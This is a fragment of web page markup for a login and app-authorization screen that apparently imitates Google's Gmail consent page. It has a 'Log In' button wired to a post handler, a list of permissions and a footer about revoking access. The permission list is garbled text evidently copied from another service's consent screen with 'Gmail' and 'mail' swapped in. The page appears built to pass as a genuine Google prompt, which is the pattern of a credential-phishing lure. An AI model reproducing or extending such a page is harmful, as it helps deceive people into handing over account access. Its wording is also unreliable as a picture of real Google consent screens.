        ...
        <div class="box">
            <div class="mini-box">
                    ...
                    <div class="submit-opstion">
                        ...
                        <button style="background-color:#06abf1" type="button" on:click={post}><b>Log In</b> </button>
                    ...
                    <div class="unorder-list">
                        <ul>
                            <li>See Gmail from your timeline (including  protected Mail) as well as your Lists and collections.</li>
                            <li>See your Gmail profile information and account settings.
                            ...
                            <li>Post and delete mail for you, and engage with mail   posted by others (Like, un-Like, or reply to a mail,
    ...
    <footer>
        <div class="custom-containerr">
            <div class="footer-text">
                <p class="big-text">We recommend reviewing the app’s terms and privacy policy to understand how it will use data from your google account.
                 You can revoke access to any app at any time from the <span>Apps and sessions</span>  section of your google account settings.</p>
